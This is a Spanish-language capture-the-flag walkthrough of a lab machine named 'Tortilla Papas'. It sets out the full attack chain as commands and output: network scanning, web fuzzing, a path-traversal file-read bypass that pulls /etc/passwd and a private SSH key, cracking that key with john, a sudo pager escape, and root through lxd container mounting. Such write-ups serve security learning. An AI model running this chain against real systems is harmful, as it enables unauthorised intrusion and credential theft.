En primer lugar, se averigua la IP del objetivo con `netdiscover`

```zsh
netdiscover

...
192.168.1.149   08:00:27:68:7a:54      1      60  PCS Systemtechnik GmbH
...
```

Con esa información ya podemos escanear la máquina. Una pasada rápida sirve para identificar que no hay más que un servidor SSH y uno web.

```zsh
nmap -p- -sT -A -T5 192.168.1.149 -oN allPorts

PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)  
| ssh-hostkey:    
|   256 9c:e0:78:67:d7:63:23:da:f5:e3:8a:77:00:60:6e:76 (ECDSA)  
|_  256 4b:30:12:97:4b:5c:47:11:3c:aa:0b:68:0e:b2:01:1b (ED25519)  
80/tcp open  http    Apache httpd 2.4.57 ((Debian))  
|_http-title: Tortilla Papas  
|_http-server-header: Apache/2.4.57 (Debian)
```

---
# La web
La página está completamente vacía de posibles vectores de ataque, después de un rato de fuzzing, encuentro dos archivos que podría ser un hilo del que tirar.

```zsh
ffuf -u "http://192.168.1.149/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -t 50 -c -r -o b  
igFiles_root -e .php,.html,.db,.conf,.config,.txt,.js,.py,.bak,.conf,.env,.jar,.csv,.xml,.md,.pdf,.zip,.rar,.jpg,.jpeg,.png,.db,.sql,.log,.jso  
n,.aspx,.cfg,.old,.phps,.pub,.pem,.cert,.key -ac

...
agua.php                [Status: 200, Size: 26594, Words: 10770, Lines: 481, Duration: 35ms]
hola.php                [Status: 200, Size: 56, Words: 5, Lines: 3, Duration: 51ms]
```

Tras probar un poco intentando sacar un LFI en *agua.php*, al final consigo dar con el parámetro y algunos bypasses de filtros

```zsh
ffuf -u "http://192.168.1.149/agua.php?FUZZ=FUZ2" -w Tortilla/Scans/params:FUZZ \
-w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZ2 -t 50 -c -r -ac
```

```zsh
curl http://192.168.1.149/agua.php?file=....//....//....//....//....//....//etc/passwd | tail -n 50

...
root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin  
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin  
concebolla:x:1000:1000:concebolla,,,:/home/concebolla:/bin/bash  
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin  
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin  
sincebolla:x:1001:1001:,,,:/home/sincebolla:/bin/bash  
_lxd:x:102:1002::/var/lib/lxd/:/bin/false  
dnsmasq:x:103:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin  
Debian-exim:x:104:110::/var/spool/exim4:/usr/sbin/nologin  
smokeping:x:105:111:SmokePing daemon,,,:/var/lib/smokeping:/usr/sbin/nologin
```

---
# LFI
Hay dos usuarios que llaman la atención: *concebolla* y *sincebolla*. Pero la fuerza bruta falla, se prueban varios métodos de LFI a RCE, pero ninguno parece funcionar

```
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/vsftpd.log
/var/log/sshd.log
/var/log/mail
/var/log/httpd/error_log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
```

Después de unas cuantas horas probando rutas y archivos de todo tipo, finalmente doy con un `id_rsa` en el directorio `/opt`.

```zsh
curl  "http://192.168.1.149/agua.php?file=....//....//....//opt/id_rsa" | tail -n 39

 % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current  
                                Dload  Upload  Total   Spent   Left   Speed  
100  29249   0  29249   0      0  5.07M      0                              0  
-----BEGIN OPENSSH PRIVATE KEY-----  
...
-----END OPENSSH PRIVATE KEY-----
```

Una vez está copiada la llave en un archivo `id_rsa`, se pasa a hash para poder crackear con john y se ataca en busca de la contraseña

```zsh
ssh2john id_rsa > hash

john -w=/usr/share/wordlists/rockyou.txt hash --fork=4
```

Al cabo de un rato obtenemos la contraseña con la que podemos entrar como el usuario *sincebolla*.

# Sin cebolla
Una vez dentro, al lanzar un `sudo -l` vemos que podemos ejecutar `smokeping` como el usuario *concebolla*. 

```zsh
sincebolla@tortillapapas:~$ sudo -l  
Matching Defaults entries for sincebolla on tortillapapas:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty  
  
User sincebolla may run the following commands on tortillapapas:  
   (concebolla) NOPASSWD: /usr/sbin/smokeping
```

Si inspeccionamos las flags con las que podemos ejecutar `smokeping` veremos que la opción `--man` abre el manual, probablemente a través de un pager como `less`. Esto habilita abrir una shell como el usuario que ejecuta el binario.

```zsh
sincebolla@tortillapapas:~$ sudo -u concebolla /usr/sbin/smokeping --help | grep man  
    --man[=x]    Show the manpage for the program (or for probe x, if specified)
    
sincebolla@tortillapapas:~$ sudo -u concebolla /usr/sbin/smokeping --man ## Dentro de less, escribimos '!/bin/bash' y le damos a enter

concebolla@tortillapapas:/home/sincebolla$ id  
uid=1000(concebolla) gid=1000(concebolla) grupos=1000(concebolla),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(  
netdev),1002(lxd)
```

Pivote conseguido, nada más aterrizar como *concebolla* vemos que está en el grupo `lxd`, un software de contenerización (sobre lo que funciona Docker). Esto habilita una escalada sencilla.

```zsh
concebolla@tortillapapas:/home/sincebolla$ lxc init ubuntu:16.04 x -c security.privileged=true ## Iniciamos un contenedor cualquiera y le damos privilegios
Creating x  
concebolla@tortillapapas:/home/sincebolla$ lxc config device add x x disk source=/ path=/mnt/ recursive=true ## Montamos en el contenedor la raíz completa del host de forma recursiva
Device x added to x  
concebolla@tortillapapas:/home/sincebolla$ lxc start x ## Iniciamos el contenedor
concebolla@tortillapapas:/home/sincebolla$ lxc exec x /bin/sh ## Y entramos en una shell

===============================================================================================================================
#DENTRO DEL CONTENEDOR
===============================================================================================================================
 
# id  
uid=0(root) gid=0(root) groups=0(root)  
# cat /mnt/root/root.txt  
**********
```
